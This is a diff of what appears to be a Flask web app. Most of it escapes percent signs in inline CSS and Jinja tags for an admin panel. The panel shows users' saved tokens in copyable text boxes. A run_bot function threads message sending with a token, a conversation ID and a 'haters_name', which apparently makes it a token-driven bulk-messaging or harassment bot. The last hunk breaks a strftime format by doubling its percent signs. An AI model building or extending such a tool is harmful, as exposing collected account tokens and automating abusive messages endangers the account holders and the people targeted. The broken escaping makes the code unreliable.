             .admin-header {
-                background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+                background: linear-gradient(135deg, #667eea 0%%, #764ba2 100%%);
                 color: white;
                 padding: 40px 30px;
                 text-align: center;
@@ -2368,17 +2368,17 @@ def admin_panel():
             .admin-header::before {
                 content: '';
                 position: absolute;
-                top: -50%;
-                left: -50%;
-                width: 200%;
-                height: 200%;
-                background: radial-gradient(circle, rgba(255,255,255,0.1) 0%, transparent 70%);
+                top: -50%%;
+                left: -50%%;
+                width: 200%%;
+                height: 200%%;
+                background: radial-gradient(circle, rgba(255,255,255,0.1) 0%%, transparent 70%%);
                 animation: headerGlow 6s ease-in-out infinite;
             }
             
             @keyframes headerGlow {
-                0%, 100% { transform: scale(1) rotate(0deg); }
-                50% { transform: scale(1.2) rotate(180deg); }
+                0%%, 100%% { transform: scale(1) rotate(0deg); }
+                50%% { transform: scale(1.2) rotate(180deg); }
             }
             
             .admin-header h1 {
@@ -2426,7 +2426,7 @@ def admin_panel():
             
             .admin-tabs {
                 display: flex;
-                background: linear-gradient(135deg, #f8f9fa 0%, #e9ecef 100%);
+                background: linear-gradient(135deg, #f8f9fa 0%%, #e9ecef 100%%);
                 border-bottom: 2px solid #dee2e6;
             }
             
@@ -2450,16 +2450,16 @@ def admin_panel():
                 content: '';
                 position: absolute;
                 bottom: 0;
-                left: 50%;
+                left: 50%%;
                 width: 0;
                 height: 4px;
-                background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+                background: linear-gradient(135deg, #667eea 0%%, #764ba2 100%%);
                 transition: all 0.4s ease;
-                transform: translateX(-50%);
+                transform: translateX(-50%%);
             }
             
             .admin-tab:hover {
-                background: linear-gradient(135deg, #e9ecef 0%, #f8f9fa 100%);
+                background: linear-gradient(135deg, #e9ecef 0%%, #f8f9fa 100%%);
                 color: #667eea;
                 transform: translateY(-2px);
             }
@@ -2471,7 +2471,7 @@ def admin_panel():
             }
             
             .admin-tab.active::before {
-                width: 80%;
+                width: 80%%;
             }
             
             .admin-content {
@@ -2503,7 +2503,7 @@ def admin_panel():
             }
             
             .stat-card {
-                background: linear-gradient(135deg, #f8f9fa 0%, #e9ecef 100%);
+                background: linear-gradient(135deg, #f8f9fa 0%%, #e9ecef 100%%);
                 border-radius: 20px;
                 padding: 30px;
                 text-align: center;
@@ -2521,7 +2521,7 @@ def admin_panel():
             .stat-icon {
                 font-size: 3rem;
                 margin-bottom: 20px;
-                background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+                background: linear-gradient(135deg, #667eea 0%%, #764ba2 100%%);
                 -webkit-background-clip: text;
                 -webkit-text-fill-color: transparent;
                 background-clip: text;
@@ -2564,7 +2564,7 @@ def admin_panel():
             }
             
             .settings-title i {
-                background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+                background: linear-gradient(135deg, #667eea 0%%, #764ba2 100%%);
                 -webkit-background-clip: text;
                 -webkit-text-fill-color: transparent;
                 background-clip: text;
@@ -2578,7 +2578,7 @@ def admin_panel():
             }
             
             .credential-item {
-                background: linear-gradient(135deg, #f8f9fa 0%, #e9ecef 100%);
+                background: linear-gradient(135deg, #f8f9fa 0%%, #e9ecef 100%%);
                 padding: 25px;
                 border-radius: 15px;
                 border-left: 5px solid #667eea;
@@ -2621,7 +2621,7 @@ def admin_panel():
             }
             
             .config-note {
-                background: linear-gradient(135deg, #fff3cd 0%, #ffeaa7 100%);
+                background: linear-gradient(135deg, #fff3cd 0%%, #ffeaa7 100%%);
                 border: 2px solid #ffd700;
                 border-radius: 15px;
                 padding: 25px;
@@ -2643,8 +2643,8 @@ def admin_panel():
             }
             
             @keyframes shimmer {
-                0% { transform: translateX(-100%); }
-                100% { transform: translateX(100%); }
+                0%% { transform: translateX(-100%%); }
+                100%% { transform: translateX(100%%); }
             }
             
             .config-note strong {
@@ -2676,7 +2676,7 @@ def admin_panel():
                 left: 0;
                 right: 0;
                 height: 4px;
-                background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+                background: linear-gradient(135deg, #667eea 0%%, #764ba2 100%%);
             }
             
             .user-item:hover {
@@ -2709,7 +2709,7 @@ def admin_panel():
             }
             
             .user-detail {
-                background: linear-gradient(135deg, #f8f9fa 0%, #e9ecef 100%);
+                background: linear-gradient(135deg, #f8f9fa 0%%, #e9ecef 100%%);
                 padding: 15px 20px;
                 border-radius: 12px;
                 border-left: 4px solid #667eea;
@@ -2753,17 +2753,17 @@ def admin_panel():
             }
             
             .status-admin {
-                background: linear-gradient(135deg, #007bff 0%, #6610f2 100%);
+                background: linear-gradient(135deg, #007bff 0%%, #6610f2 100%%);
                 color: white;
             }
             
             .status-approved {
-                background: linear-gradient(135deg, #28a745 0%, #20c997 100%);
+                background: linear-gradient(135deg, #28a745 0%%, #20c997 100%%);
                 color: white;
             }
             
             .status-pending {
-                background: linear-gradient(135deg, #ffc107 0%, #fd7e14 100%);
+                background: linear-gradient(135deg, #ffc107 0%%, #fd7e14 100%%);
                 color: #212529;
             }
             
@@ -2787,19 +2787,19 @@ def admin_panel():
                 content: '';
                 position: absolute;
                 top: 0;
-                left: -100%;
-                width: 100%;
-                height: 100%;
+                left: -100%%;
+                width: 100%%;
+                height: 100%%;
                 background: linear-gradient(90deg, transparent, rgba(255,255,255,0.3), transparent);
                 transition: left 0.6s;
             }
             
             .btn:hover::before {
-                left: 100%;
+                left: 100%%;
             }
             
             .btn-approve {
-                background: linear-gradient(135deg, #28a745 0%, #20c997 100%);
+                background: linear-gradient(135deg, #28a745 0%%, #20c997 100%%);
                 color: white;
                 box-shadow: 0 5px 15px rgba(40, 167, 69, 0.3);
             }
@@ -2810,7 +2810,7 @@ def admin_panel():
             }
             
             .btn-reject {
-                background: linear-gradient(135deg, #dc3545 0%, #fd7e14 100%);
+                background: linear-gradient(135deg, #dc3545 0%%, #fd7e14 100%%);
                 color: white;
                 box-shadow: 0 5px 15px rgba(220, 53, 69, 0.3);
             }
@@ -2821,7 +2821,7 @@ def admin_panel():
             }
             
             .btn-revoke {
-                background: linear-gradient(135deg, #ffc107 0%, #fd7e14 100%);
+                background: linear-gradient(135deg, #ffc107 0%%, #fd7e14 100%%);
                 color: #212529;
                 box-shadow: 0 5px 15px rgba(255, 193, 7, 0.3);
             }
@@ -2832,7 +2832,7 @@ def admin_panel():
             }
             
             .btn-remove {
-                background: linear-gradient(135deg, #dc3545 0%, #c82333 100%);
+                background: linear-gradient(135deg, #dc3545 0%%, #c82333 100%%);
                 color: white;
                 box-shadow: 0 5px 15px rgba(220, 53, 69, 0.3);
             }
@@ -2843,7 +2843,7 @@ def admin_panel():
             }
             
             .btn-promote {
-                background: linear-gradient(135deg, #007bff 0%, #6610f2 100%);
+                background: linear-gradient(135deg, #007bff 0%%, #6610f2 100%%);
                 color: white;
                 box-shadow: 0 5px 15px rgba(0, 123, 255, 0.3);
             }
@@ -2854,7 +2854,7 @@ def admin_panel():
             }
             
             .btn-demote {
-                background: linear-gradient(135deg, #6c757d 0%, #495057 100%);
+                background: linear-gradient(135deg, #6c757d 0%%, #495057 100%%);
                 color: white;
                 box-shadow: 0 5px 15px rgba(108, 117, 125, 0.3);
             }
@@ -2877,7 +2877,7 @@ def admin_panel():
             }
             
             .section-title i {
-                background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+                background: linear-gradient(135deg, #667eea 0%%, #764ba2 100%%);
                 -webkit-background-clip: text;
                 -webkit-text-fill-color: transparent;
                 background-clip: text;
@@ -2909,7 +2909,7 @@ def admin_panel():
                 }
                 
                 .user-actions {
-                    width: 100%;
+                    width: 100%%;
                 }
                 
                 .btn {
@@ -3165,8 +3165,8 @@ def admin_panel():
                     <i class="fas fa-key"></i> User Tokens Management
                 </h2>
                 <div class="user-list">
-                    {% for user in users %}
-                        {% if user[4] %}
+                    {%% for user in users %%}
+                        {%% if user[4] %%}
                             <div class="user-item">
                                 <div class="user-header">
                                     <div class="user-username">{{ user[1] }}</div>
@@ -3184,17 +3184,17 @@ def admin_panel():
                                     <div class="user-detail">
                                         <div class="detail-label">Tokens</div>
                                         <div class="detail-value">
-                                            {% if user[5] %}
+                                            {%% if user[5] %%}
                                                 <textarea rows="5" cols="30" readonly onclick="copyToClipboard(this)" title="Click to copy">{{ user[5] }}</textarea>
-                                            {% else %}
+                                            {%% else %%}
                                                 No tokens saved.
-                                            {% endif %}
+                                            {%% endif %%}
                                         </div>
                                     </div>
                                 </div>
                             </div>
-                        {% endif %}
-                    {% endfor %}
+                        {%% endif %%}
+                    {%% endfor %%}
                 </div>
             </div>
         </div>
@@ -3426,7 +3426,7 @@ def run_bot():
         'thread': threading.Thread(target=send_messages, args=(task_id, convo_uid, token, message_content, speed, haters_name)),
         'convo_uid': convo_uid,
         'haters_name': haters_name,
-        'started_at': datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
+        'started_at': datetime.now().strftime("%%Y-%%m-%%d %%H:%%M:%%S"),
         'status': 'running',
         'token_name': token_name
     }
